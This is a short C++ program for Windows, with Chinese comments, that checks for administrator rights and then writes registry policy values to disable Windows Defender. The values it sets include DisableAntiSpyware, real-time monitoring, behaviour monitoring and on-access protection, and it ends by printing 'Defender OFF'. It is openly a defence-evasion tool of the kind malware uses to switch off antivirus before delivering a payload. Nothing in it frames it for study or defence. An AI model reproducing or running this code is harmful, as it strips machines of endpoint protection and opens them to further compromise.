#include <cstdio>
#include <windows.h>

//检查管理员权限
bool isUserAdmin() {
  bool isElevated = false;
  HANDLE token;
  TOKEN_ELEVATION elev;
  DWORD size;
  if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
    if (GetTokenInformation(token, TokenElevation, &elev, sizeof(elev), &size)) {
       isElevated = elev.TokenIsElevated;
    }
  }
  if (token) {
    CloseHandle(token);
    token = NULL;
  }
  return isElevated;
}

//禁用Windows Defender
int main(int argc, char* argv[]) {
  HKEY key;
  HKEY new_key;
  DWORD disable = 1;

  if (!isUserAdmin()) {
    printf("please, run as admin.\n");
    return -1;
  }

  LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_ALL_ACCESS, &key);
  if (res == ERROR_SUCCESS) {
    RegSetValueEx(key, "DisableAntiSpyware", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
    RegCreateKeyEx(key, "Real-Time Protection", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &new_key, 0);
    RegSetValueEx(new_key, "DisableRealtimeMonitoring", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
    RegSetValueEx(new_key, "DisableBehaviorMonitoring", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
    RegSetValueEx(new_key, "DisableScanOnRealtimeEnable", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
    RegSetValueEx(new_key, "DisableOnAccessProtection", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
    RegSetValueEx(new_key, "DisableIOAVProtection", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));

    RegCloseKey(key);
    RegCloseKey(new_key);
  }

  printf("Defender OFF. \nPlease Restart Windows.\n");
  return 1;
}
